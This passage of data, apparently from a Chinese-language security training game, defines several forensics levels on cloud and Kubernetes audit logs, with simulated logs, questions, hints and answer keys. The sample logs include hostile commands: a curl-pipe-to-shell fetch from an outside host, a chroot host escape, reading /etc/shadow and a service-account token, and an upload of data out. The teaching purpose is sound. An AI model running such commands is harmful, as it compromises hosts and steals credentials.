      '03:20:00,ops01@console,CreateRAMUser,10.1.5.7,name=migrate-tmp（已审批）',
      '03:47:00,??,CreateRAMUser,45.83.90.12,name=hx-support',
      '03:47:10,??,AttachPolicy,45.83.90.12,hx-support += AdministratorAccess',
      '03:48:00,??,CreateAccessKey,45.83.90.12,for hx-support',
      '03:49:00,hx-support,ListInstances,45.83.90.12,开始摸排资产',
    ]},
    tasks: [
      { q: '被凭空创建的用户名', hint: '找 src 为境外 IP 的 CreateRAMUser', ans: ['hx-support'], teach: '🧑‍💼 名字装成"支持团队"——云上建号+提权+发钥匙三连=持久化接管。' },
      { q: '给它挂载的策略名', hint: 'grep Administrator /logs/cloud_audit.csv', ans: ['administratoraccess', 'administrator'], teach: '👑 AdministratorAccess=云上上帝权限。策略挂载必须双人审批。' },
      { q: '操作者来源 IP', hint: '看那几条的 src 列', ans: ['45.83.90.12'], teach: '🌍 控制台操作来自境外 IDC——主账号/运维账号已失陷。' },
    ],
    victory: ['结论：控制台凭据失陷，境外创建 hx-support 并授予 AdministratorAccess。', '处置：删用户/密钥 → 重置控制台凭据+MFA → 全量审计该 IP 的操作。'] },

  /* ========== ⑪ 容器审计日志 ========== */
  { id: 'k1', ico: '📦', title: 'K8s 审计 · 特权容器', cat: '容器审计日志', diff: 1,
    brief: '开发随手起了一个"调试用"的容器——带上帝模式的那种。',
    files: { '/logs/k8s_audit.csv': [
      'ts,user,verb,resource,ns,detail',
      '14:00:00,dev01,create,pod,default,name=debug-tool privileged=true hostPID=true',
      '14:01:00,dev01,exec,pod/default/debug-tool,cmd=bash',
      '14:02:00,dev01,exec,pod/default/debug-tool,cmd=ls /host',
      '15:00:00,cicd-bot,create,pod,default,name=api-v1.2.3 privileged=false',
    ]},
    tasks: [
      { q: '以特权模式创建的 Pod 名', hint: 'grep privileged /logs/k8s_audit.csv', ans: ['debug-tool'], teach: '📦 privileged=true = 容器拥有近乎宿主机的全部权限，等于把钥匙插门上。' },
      { q: '那个危险的能力字段名', hint: 'detail 里代表"特权"的词', ans: ['privileged'], teach: '⚙️ privileged + hostPID 组合基本等于宿主机 root。生产集群应默认拒绝。' },
      { q: '创建者账号', hint: '看 user 列', ans: ['dev01'], teach: '👤 开发"顺手"起特权容器是真实世界容器失陷的高频起点。' },
    ],
    victory: ['结论：dev01 创建特权容器 debug-tool 并 exec 进去查看宿主机。', '整改：PSP/OPA 禁 privileged + exec 审计 + 最小权限运行时。'] },

  { id: 'k2', ico: '🧲', title: 'K8s 审计 · 挂载宿主机根目录', cat: '容器审计日志', diff: 2,
    brief: '一个"备份"Pod 把宿主机的整个根目录挂了进去……',
    files: { '/logs/k8s_audit.csv': [
      '03:00:00,svc-backup,create,pod,kube-system,name=backup-runner volumes=[hostPath:/]',
      '03:00:10,svc-backup,exec,pod/kube-system/backup-runner,cmd=chroot /host bash',
      '03:01:00,svc-backup,exec,pod/kube-system/backup-runner,cmd=cat /host/etc/shadow',
      '03:05:00,cicd-bot,create,pod,default,name=api-v2.0 privileged=false',
    ]},
    tasks: [
      { q: '被挂载进容器的宿主机路径', hint: 'grep hostPath /logs/k8s_audit.csv', ans: ['/', 'hostpath'], teach: '🧲 hostPath:/ = 容器里看到的就是宿主机整个文件系统，容器边界直接消失。' },
      { q: '这个行为的危险定性（输 check 四个字）', hint: '容器看到宿主根目录，下一步就是？', ans: ['容器逃逸', '逃逸'], teach: '🕳️ 容器逃逸：从隔离环境跨进宿主机。chroot /host + 读 shadow 就是逃逸动作。' },
      { q: '攻击者读走的敏感文件（输 check 文件名）', hint: 'exec 里的 cat 目标', ans: ['shadow', '/etc/shadow'], teach: '🔐 shadow 里有全部密码哈希——抓去离线爆破就是全域密码。' },
    ],
    victory: ['结论：backup-runner 挂载宿主根目录并读取 shadow——事实上的容器逃逸。', '处置：删 Pod → 宿主机视为失陷 → 全量凭据轮换 → hostPath 策略收紧。'] },

  { id: 'k3', ico: '🐝', title: 'K8s 审计 · CI 账号进生产容器', cat: '容器审计日志', diff: 3,
    brief: '凌晨三点，CI 机器人"走进"了支付容器，还下载了点东西。',
    files: { '/logs/k8s_audit.csv': [
      '03:10:00,cicd-bot,exec,pod/prod/payment-api,cmd=curl -s http://update-svc.xyz/x|sh',
      '03:10:30,cicd-bot,exec,pod/prod/payment-api,cmd=cat /etc/podinfo/token',
      '03:11:00,cicd-bot,create,pod/prod/exfil-helper,hostNetwork=true',
      '03:11:20,exfil-helper,net,OUTBOUND,45.60.40.10:8443 上传 3MB',
    ]},
    tasks: [
      { q: '被"进入"的生产服务名', hint: 'grep exec /logs/k8s_audit.csv 看第一条', ans: ['payment-api'], teach: '🐝 kubectl exec 是运维正常操作——但凌晨三点由 CI 账号对支付容器执行，基线完全不符。' },
      { q: '执行的危险命令关键词（输 check 命令名）', hint: '远程脚本直接管道给 shell', ans: ['curl'], teach: '⬇️ curl|sh 在容器里一样致命，还更容易被误当成 CI 行为。' },
      { q: '攻击者拿走的云原生凭据（输 check：容器里的___）', hint: 'cat /etc/podinfo/token', ans: ['token', 'satoken', 'serviceaccount'], teach: '🎟️ ServiceAccount Token 是 Pod 内置身份，泄露即可以该身份调 API。' },
    ],
    victory: ['结论：cicd-bot 凭据失陷，凌晨进入 payment-api 偷取 SA Token 并外传数据。', '处置：吊销 SA Token+CI 凭据轮换+exec 审计告警+出口白名单。'] },

